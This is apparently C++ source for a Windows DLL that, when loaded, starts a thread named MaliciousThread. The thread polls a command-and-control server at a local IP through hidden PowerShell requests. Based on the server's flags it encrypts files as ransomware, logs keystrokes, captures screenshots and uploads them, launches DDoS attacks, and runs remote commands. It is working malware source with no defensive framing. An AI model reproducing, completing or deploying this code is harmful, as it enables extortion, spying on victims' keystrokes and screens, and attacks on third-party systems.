#include "pch.h"
#include "resource.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <CommCtrl.h>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winhttp.h>
#define _CRT_SECURE_NO_WARNINGS
#include <cpr/cpr.h>
#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/modes.h>
#include <cryptopp/files.h>
#include <cryptopp/osrng.h>
#include <cryptopp/hex.h>
#include <ctime>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <thread>
#include <filesystem>
#include <cstdio>
#include <windows.h>
#include <jpeglib.h>
#include <iostream>
#include <fstream>
#include <setjmp.h>
#include <iomanip>
#include <regex>
#include "utils.h"
#include "ransomware.h"
#include "screencapture.h"
#include "ddos.h"
#include "keylogger.h"
#include "comandos.h"
#include <atomic>
#include <thread>


#include <nlohmann/json.hpp>
using json = nlohmann::json;

#include <fmt/core.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "comctl32.lib")

using namespace CryptoPP;
namespace fs = std::filesystem;

std::atomic<bool> keyloggerRunning{ false };

nlohmann::json obtainClientInfo() {
    std::string output;
    const char* cmd = "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://192.168.1.26:8000/clients/1' -UseBasicParsing | Select-Object -ExpandProperty Content\"";

    ExecuteCommandHidden(cmd, output);

    return nlohmann::json::parse(output);
}

DWORD WINAPI MaliciousThread(LPVOID lpParameter) {
    
    nlohmann::json respuesta = obtainClientInfo();
    
    bool ransomwareActive = respuesta["ransomware"];
    bool keyloggerActive = respuesta["keylogger"];
    bool screencaptureActive = respuesta["screencapture"];
    bool ddosActive = respuesta["ddos"];
    auto ultimoChequeo = std::chrono::steady_clock::now();
    auto ultimoChequeoScreenshot = std::chrono::steady_clock::now();

    std::thread keyloggerThread;
    while (true) {
        

        auto ahora = std::chrono::steady_clock::now();
        
            
        respuesta = obtainClientInfo();
        ransomwareActive = respuesta["ransomware"];
        keyloggerActive = respuesta["keylogger"];
        screencaptureActive = respuesta["screencapture"];
        ddosActive = respuesta["ddos"];
        ultimoChequeo = ahora;
            
        executeCommands();
      
        if (ddosActive) {
            executeDDoS();
        }
        if (ransomwareActive) { 
            encryptFiles();
            CreateThread(NULL, 0, CreateFullscreenWindowAdapter, NULL, 0, NULL);
        }

        if (screencaptureActive) {
           CaptureAndSaveScreenshot();
           SendPicturesToServer();
        }
        
        if (keyloggerActive) {
            keyloggerRunning = true;
            const std::string logFilePath = "C:\\Users\\Sergio\\Desktop\\keylog.txt";
            bool keysState[256] = { false };

            if (!keyloggerThread.joinable()) {
                keyloggerThread = std::thread(logKeyStrokes, logFilePath, keysState, std::ref(keyloggerRunning));
                keyloggerThread.detach();
            }
        }
        else {
            keyloggerRunning = false;
        }
        Sleep(3000);
    }
    
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, MaliciousThread, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}